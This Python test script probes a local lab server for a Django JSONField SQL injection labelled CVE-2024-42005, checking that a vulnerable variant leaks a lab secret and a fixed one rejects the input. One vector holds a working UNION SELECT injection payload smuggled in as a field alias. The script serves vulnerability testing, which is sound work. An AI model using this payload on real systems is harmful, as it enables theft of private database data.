import json
import sys
import urllib.error
import urllib.parse
import urllib.request

variant = sys.argv[1]
assert variant in {"vulnerable", "fixed"}
opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
results = []
vectors = [
    ("public JSON property", "benign", "customer", 200, ["PUBLIC_CUSTOMER"]),
    ("numeric JSON property", "benign", "amount", 200, [100]),
    ("missing JSON property", "robustness", "missing", 200, [None]),
    ("alias changes query to read private table", "attack",
     'x" FROM "reports_record" UNION SELECT "value" FROM "reports_secret" --',
     200 if variant == "vulnerable" else 400, [None, "LAB_PRIVATE_ACCOUNTING_KEY"] if variant == "vulnerable" else None),
]
for name, kind, field, status, values in vectors:
    try:
        url = "http://web:8000/report/?" + urllib.parse.urlencode({"field": field})
        try:
            response = opener.open(url, timeout=8)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            actual_status = response.status
            body = response.read().decode()
        assert actual_status == status, (actual_status, status, body[:400])
        data = json.loads(body)
        if values is not None:
            assert data["values"] == values, data
        else:
            assert data == {"error": "Invalid field alias"}, data
        results.append({"case_id": "django-jsonfield/CVE-2024-42005", "name": name, "kind": kind, "status": "pass"})
    except Exception as error:
        results.append({"case_id": "django-jsonfield/CVE-2024-42005", "name": name, "kind": kind, "status": "fail", "error": repr(error)})
print("BADASS_RESULT=" + json.dumps({"variant": variant, "checks": results}))
sys.exit(0 if results and all(r["status"] == "pass" for r in results) else 1)
